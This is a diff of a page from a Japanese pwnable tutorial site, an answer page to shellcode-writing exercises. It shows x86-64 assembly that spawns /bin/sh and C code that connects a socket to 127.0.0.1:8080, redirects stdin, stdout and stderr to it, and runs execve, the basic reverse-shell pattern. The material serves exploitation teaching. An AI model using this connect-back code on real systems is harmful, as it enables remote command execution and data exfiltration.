@@ -18,7 +18,13 @@
     <meta name="author" content="ptr-yudai">
 
 
+    <meta name="subtitle" content="pawnyable">
 
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
 
 
 
@@ -133,13 +139,17 @@ p.spoiler {
     <div class="post-info">
         <div class="post-title">
             
-            
                 例題の解答 - シェルコードの書き方
-            
-            
+                        
         </div>
     </div>
     <div class="h-line-primary"></div>
+    
+    
+        <div class="column" title="目次">
+            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A1%8C%EF%BC%91"><span class="toc-text">例題１</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A1%8C%EF%BC%92"><span class="toc-text">例題２</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A1%8C%EF%BC%93"><span class="toc-text">例題３</span></a></li></ol>
+        </div>
     
 </div>
 
@@ -154,20 +164,20 @@ p.spoiler {
 <h2 id="例題２">例題２</h2>
 <p>【問題】<br>
 シェルコード領域は書き込み可能だがRSPの初期値が0から始まる状況で、次のようなシェルコードを書いたところ、Segmentation Faultを起こしてしまいました。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">  xor esp, esp    ; 初期状態RSP=0</span><br><span class="line">  lea rsp, [rel stack]</span><br><span class="line">  xor edx, edx</span><br><span class="line">  push rdx</span><br><span class="line">  lea rdi, [rel s_arg2]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg1]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg0]</span><br><span class="line">  push rdi</span><br><span class="line">  mov rsi, rsp</span><br><span class="line">  mov eax, 59</span><br><span class="line">  syscall</span><br><span class="line">  int3</span><br><span class="line">stack: times 1024 dq 0</span><br><span class="line">s_arg0: db &quot;/bin/sh&quot;, 0</span><br><span class="line">s_arg1: db &quot;-c&quot;, 0</span><br><span class="line">s_arg2: db &quot;/bin/ls -lha&quot;, 0</span><br></pre></td></tr></table></figure>
-<p>原因を特定して直してください。（ヒント：textセクションを書き込み可能にするにはldに<code>--omagic</code>オプションを渡す。）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; $ nasm test.S -fELF64</span><br><span class="line">; $ ld test.o --omagic</span><br><span class="line">; $ ./a.out</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">  xor esp, esp    ; 初期状態RSP=0</span><br><span class="line">  lea rsp, [rel stack]</span><br><span class="line">  xor edx, edx</span><br><span class="line">  push rdx</span><br><span class="line">  lea rdi, [rel s_arg2]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg1]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg0]</span><br><span class="line">  push rdi</span><br><span class="line">  mov rsi, rsp</span><br><span class="line">  mov eax, 59</span><br><span class="line">  syscall</span><br><span class="line">  int3</span><br><span class="line">stack: times 1024 dq 0</span><br><span class="line">s_arg0: db &quot;/bin/sh&quot;, 0</span><br><span class="line">s_arg1: db &quot;-c&quot;, 0</span><br><span class="line">s_arg2: db &quot;/bin/ls -lha&quot;, 0</span><br></pre></td></tr></table></figure>
+<p>原因を特定して直してください。</p>
 <p>【解答】<br>
 このシェルコードではスタックを利用するためにスタックポインタをシェルコード領域に設定しています。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea rsp, [rel stack]</span><br></pre></td></tr></table></figure>
 <p>スタックは低位アドレスに向かって利用されますが、ラベル<code>stack</code>は用意されたスタック領域の先頭を指しています。したがって、以降<code>push</code>命令が呼ばれると機械語領域を破壊してしまいます。<br>
 5行目を次のように変更すればスタックポインタの位置は正しくなります。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea rsp, [rel stack + 1024]</span><br></pre></td></tr></table></figure>
-<p>なお、今回の場合はこれで問題ないですが、もし外部関数を呼び出す場合はアラインメントに注意しましょう。いくつかの関数では<code>movaps</code>などの、スタックポインタが8の倍数でないと例外を引き起こしてしまう命令を使っています。アラインするには次のように<code>align</code>疑似命令を利用できます。</p>
+<p>なお、ユーザーランドの場合はこれで問題ないですが、もしカーネル空間でこのような処理をする場合、アラインメントに注意する必要があります。カーネルではスタックポインタが8の倍数でないと例外を引き起こしてしまうため、次のように<code>align</code>を利用しましょう。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">align 8</span><br><span class="line">stack: times 1024 dq 0</span><br></pre></td></tr></table></figure>
 <p>ファイルの全体は<a href="src/bug-fixed.S">ここ</a>からダウンロードできます。</p>
 <h2 id="例題３">例題３</h2>
 <p>【問題】<br>
-「ls -lha」した結果を自分のサーバー（例：127.0.0.1:8080）に送信するシェルコードを書いてください。（ヒント：標準入出力をsocketのfdにdupするとpipeを作らなくてもexecveするだけで結果が転送される。）</p>
+「ls -lha」した結果を自分のサーバー（例：127.0.0.1:8080）に送信するシェルコードを書いてください。ただし、&quot;/dev/tcp&quot;などのスペシャルデバイスファイルは使わないこと。（ヒント：標準入出力をsocketのfdにdupするとpipeを作らなくてもexecveするだけで結果が転送される。）</p>
 <p>【解答】<br>
 特殊な構造体が出てくるような複雑なシェルコードを書くのが難しい時はC言語で書いてコンパイルしたものを参考にしましょう。今回のコードは次のようになります。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">  <span class="type">int</span> sock;</span><br><span class="line"></span><br><span class="line">  sa.sin_family = AF_INET;</span><br><span class="line">  sa.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">  sa.sin_port = htons(<span class="number">8080</span>);</span><br><span class="line">  sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  connect(sock, (<span class="keyword">struct</span> sockaddr*)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  dup2(sock, <span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">1</span>);</span><br><span class="line">  dup2(sock, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/ls -lha&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">  execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -196,7 +206,7 @@ p.spoiler {
     <div class="flex-container">
         <div class="footer-text">
             
-                © 2022 ptr-yudai 🐈
+                © 2023 ptr-yudai 🐈
                 <br>
             
             
